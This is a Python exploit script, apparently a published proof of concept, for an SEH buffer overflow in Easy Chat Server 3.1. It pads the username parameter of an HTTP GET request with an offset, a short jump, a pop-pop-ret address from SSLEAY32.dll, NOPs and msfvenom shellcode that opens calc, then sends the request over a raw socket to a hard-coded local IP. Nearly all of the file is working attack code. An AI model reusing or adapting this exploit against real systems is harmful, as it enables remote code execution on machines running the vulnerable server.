#!/usr/bin/env python

print "``````````````````````````````````````````````````````````````````````"
print "`   Exploit By      : 0xAnnLynn                                      `"
print "`   Exploit Title   : Easy chat server 3.1 (SEH)                     `"
print "`   Exploit Date    : 04.01.2021                                     `"
print "`   Practice        : Unknown                                        `"
print "`   GitHub          : https://github.com/TamilHackz/i-make-exploits  `"
print "`                                                                    `"
print "``````````````````````````````````````````````````````````````````````"

import socket

#msfvenom -p windows/exec CMD='calc' -f c -b '\x00\x0a\x0d\x20'

shellcode = (
"\xdb\xd8\xd9\x74\x24\xf4\x58\xba\x9f\x99\xf4\x18\x29\xc9\xb1"
"\x30\x31\x50\x18\x03\x50\x18\x83\xe8\x63\x7b\x01\xe4\x73\xfe"
"\xea\x15\x83\x9f\x63\xf0\xb2\x9f\x10\x70\xe4\x2f\x52\xd4\x08"
"\xdb\x36\xcd\x9b\xa9\x9e\xe2\x2c\x07\xf9\xcd\xad\x34\x39\x4f"
"\x2d\x47\x6e\xaf\x0c\x88\x63\xae\x49\xf5\x8e\xe2\x02\x71\x3c"
"\x13\x27\xcf\xfd\x98\x7b\xc1\x85\x7d\xcb\xe0\xa4\xd3\x40\xbb"
"\x66\xd5\x85\xb7\x2e\xcd\xca\xf2\xf9\x66\x38\x88\xfb\xae\x71"
"\x71\x57\x8f\xbe\x80\xa9\xd7\x78\x7b\xdc\x21\x7b\x06\xe7\xf5"
"\x06\xdc\x62\xee\xa0\x97\xd5\xca\x51\x7b\x83\x99\x5d\x30\xc7"
"\xc6\x41\xc7\x04\x7d\x7d\x4c\xab\x52\xf4\x16\x88\x76\x5d\xcc"
"\xb1\x2f\x3b\xa3\xce\x30\xe4\x1c\x6b\x3a\x08\x48\x06\x61\x46"
"\x8f\x94\x1f\x24\x8f\xa6\x1f\x18\xf8\x97\x94\xf7\x7f\x28\x7f"
"\xbc\x70\x62\x22\x94\x18\x2b\xb6\xa5\x44\xcc\x6c\xe9\x70\x4f"
"\x85\x91\x86\x4f\xec\x94\xc3\xd7\x1c\xe4\x5c\xb2\x22\x5b\x5c"
"\x97\x40\x3a\xce\x7b\x87"
)

offset = "A"*217
SEH = "\x21\x7f\x01\x10"   #0x10017F21 from SSLEAY32.dll
nSEH = "\xeb\x06\x90\x90"  #SHORT JMP 
nops = "\x90"*20
junk = "C"*500

payload = offset + nSEH + SEH + nops + shellcode + junk

head  = "GET /chat.ghp?username="+payload+"&password=a&room=1 HTTP/1.1\r\n"
head += "Host: 192.168.0.113\r\n"

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('192.168.0.110',80))
s.send(head + "\r\n\r\n")
